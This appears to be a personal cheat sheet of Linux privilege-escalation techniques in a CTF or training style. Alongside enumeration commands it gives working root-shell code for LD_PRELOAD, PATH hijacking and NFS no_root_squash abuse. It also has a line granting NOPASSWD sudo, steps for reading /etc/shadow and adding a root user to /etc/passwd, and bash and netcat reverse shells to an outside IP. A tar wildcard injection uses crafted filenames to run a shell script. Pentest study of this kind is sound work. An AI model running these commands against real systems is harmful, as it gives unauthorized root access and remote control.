# Linux PrivEsc

> Shahrukh Tramboo | February 7th, 2022

--------------------------------------

**Upgrade shell**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

-----------------------------------------------

**Enumeration**

Commands:
1.	hostname

2.	uname -a

3.	/proc/version
Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

4.	/etc/issue
Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system but can easily be customized or changed.

5.	ps Command
The “ps” command provides a few useful options.
	```bash
	ps -A
	``` 
	View all running processes
	
	```bash
	ps axjf 
	```
	View process tree
	
	```bash
	ps aux 
	```
	The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x).

6.	env

7.	sudo -l

8.	ls

9.	id

10.	/etc/passwd
While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks.

```bash
cat /etc/passwd | cut -d ":" -f 1
```

11.	history

12.	ifconfig
Our attacking machine can reach the eth0 interface but can not directly access the two other networks.
This can be confirmed using the 
```bash
ip route
```
command to see which network routes exist.

13.	netstat
The netstat command can be used with several different options to gather information on existing connections.
	```bash
	netstat -a
	```
	shows all listening ports and established connections.
	
	```bash
	netstat -at
	``` 
	or 
	```bash
	netstat -au 
	```
	can also be used to list TCP or UDP protocols respectively.
	
	```bash
	netstat -l
	```
	list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol
	
	```bash
	netstat -s
	```
	list network usage statistics by protocol.This can also be used with the -t or -u options to limit the output to a specific protocol.

	```bash
	netstat -tp
	```
	list connections with the service name and PID information.
	This can also be used with the -l option to list listening ports
	We can see the “PID/Program name” column is empty as this process is owned by another user. Run the same command with root privileges

	```bash
	netstat -i
	```
	 Shows interface statistics. Which are more active?


	The netstat usage you will probably see most often in blog posts, write-ups, and courses is
	```bash
	netstat -ano
	```
	-a: Display all sockets
	-n: Do not resolve names
	-o: Display timers

	```bash
	netstat -tan | grep 8080
	```

14.	find Command
	```bash
	find . -name flag1.txt
	```
	find the file named “flag1.txt” in the current directory


	```bash
	find / -type d -name config
	```
	find the directory named config under “/”


	```bash
	find / -type f -perm 0777
	```
	find files with the 777 permissions


	```bash
	find / -perm a=x
	```
	find executable files


	```bash
	find /home -user frank
	```

	```bash
	find / -mtime 10
	```
	find files that were modified in the last 10 days

	```bash
	find / -atime 10
	```
	find files that were accessed in the last 10 day

	```bash
	find / -cmin -60
	```
	find files changed within the last hour (60 minutes)

	```bash
	find / -amin -60
	```

	```bash
	find / -size 50M
	```
	or

	```bash
	find / -size +50M
	```

 	“find” command tends to generate errors which sometimes makes the output hard to read
	```bash
	2>/dev/null
	```

	Folders and files that can be written to or executed from:
	```bash
	find / -writable -type d 2>/dev/null
	```
	Find world-writeable folders

	```bash
	find / -perm -222 -type d 2>/dev/null
	```
	Find world-writeable folders

	```bash
	find / -perm -o w -type d 2>/dev/null
	```
	Find world-writeable folders

	```bash
	find / -perm -o x -type d 2>/dev/null
	```
	Find world-executable folders

	```bash
	find / -name perl*
	find / -name python*
	find / -name gcc*
	```
	Find development tools and supported languages

	```bash
	find / -perm -u=s -type f 2>/dev/null
	```
	Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

------------------------------------------------------------------

**Automated Enumeration Tools**

LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

LinEnum: https://github.com/rebootuser/LinEnum

LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester

Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration

Linux Priv Checker: https://github.com/linted/linuxprivchecker	

------------------------------------------------------------------

**Privilege Escalation: Kernel Exploits**

Sources such as https://www.linuxkernelcves.com/cves can also be useful.

Another alternative would be to use a script like 
```bash
LES (Linux Exploit Suggester)
```
but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. 

---------------------------------------------------------------

**Privilege Escalation: Sudo**

https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

Leverage LD_PRELOAD:
LD_PRELOAD is a function that allows any program to use shared libraries.
This blog post will give you an idea about the capabilities of LD_PRELOAD.
https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/

The steps of this privilege escalation vector can be summarized as follows;

1.	Check for LD_PRELOAD (with the env_keep option)
2.	Write a simple C code compiled as a share object (.so extension) file
3.	Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file


The C code will simply spawn a root shell and can be written as follows;
```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}	
```

then save it as shared library
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

then run
```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

--------------------------------------------
To add user to sudoers do this, so you can run sudo su, and go to root

```bash
echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
```

--------------------------------------------------------------

**Privilege Escalation: SUID**

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
will list files that have SUID or SGID bits set.

A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io).


John the Ripper: unshadow tool
To achieve this, unshadow needs both the /etc/shadow and /etc/passwd files.
```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

```bash
openssl passwd -1 -salt THM password1
```
We will then add this password with a username to the /etc/passwd file.

----------------------------------------------------------------

**Privilege Escalation: Capabilities**

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level.

We can use the 
```bash
getcap -r / 2>/dev/null 
```
tool to list enabled capabilities.

When run as an unprivileged user, getcap -r / will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.

----------------------------------------------------------------

**Privilege Escalation: Cron Jobs**

```bash
cat /etc/crontab
```

We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.

```bash
cat backup.sh

#!/bin/bash

bash -i >& /dev/tcp/10.17.39.185/6666 0>&1

```
-----------------------------------------------------------------

**Privilege Escalation: PATH**

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script.

```bash
echo $PATH
```

1.	What folders are located under $PATH
2.	Does your current user have write privileges for any of these folders?
3.	Can you modify $PATH?
4.	Is there a script/application you can start that will be affected by this vulnerability?

script like

```bash
#include<unistd.h>
void main(){
	setuid(0);
	setgid(0);
	system("thm");
}
```

```bash
gcc path_exp.c -o path -w
chmod +s path
```

```bash
find / -writable 2>/dev/null
```

we have tmp folder here as writable, suppose

```bash
export PATH=/tmp:$PATH
cd /tmp
echo "/bin/bash" > thm
chmod 777 thm
```

-----------------------------------------------------------------

**Privilege Escalation: NFS**

finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

```bash
cat /etc/exports
```

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.

```bash
showmount -e 10.10.2.15
```

check the share that you have executable rights on target machine

add this below to the mounted directory

```bash
#include<unistd.h>
int main(){
	setuid(0);
	setgid(0);
	system("/bin/bash");
	return 0;
}
gcc nfs.c -o nfs -w
chmod +s nfs
```
-----------------------------------------------------

The issue can be manifested by using specific options in chown, tar, rsync etc. By using specially crafted filenames, an attacker can inject arbitrary arguments to shell commands run by other users – root as well.

**Privilege escalation tar**

Running 
```bash
tar cf archive.tar *
``` 
on a folder with these files seems pretty straightforward and benign.
The problem arises if the user created a couple of fake files and a shell script that contains any arbitrary command.

```bash
-rw-r–r–. 1 leon leon 0 Oct 28 19:19 –checkpoint=1

-rw-r–r–. 1 leon leon 0 Oct 28 19:17 –checkpoint-action=exec=sh shell.sh

-rw-rw-r–. 1 user user 187 Oct 28 17:44 db.php

-rw-rw-r–. 1 user user 201 Oct 28 17:43 download.php

-rwxr-xr-x. 1 leon leon 12 Oct 28 19:17 shell.sh
```

By using the * wildcard in the tar command, these files will be understood as passed options to the tar binary and shell.sh will be executed as root.

Basically, tar allows the usage of 2 options that can be used for poisoning, in order to force the binary to execute unintended actions:

1.	checkpoint[=NUMBER] — this option displays progress messages every NUMBERth record (default value is 10)
2.	checkpoint-action=ACTION — this option executes said ACTION on each checkpoint

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.39.185 4455 >/tmp/f" > shell.sh && touch "/var/www/html/--checkpoint-action=exec=sh shell.sh" && touch "/var/www/html/--checkpoint=1"
```
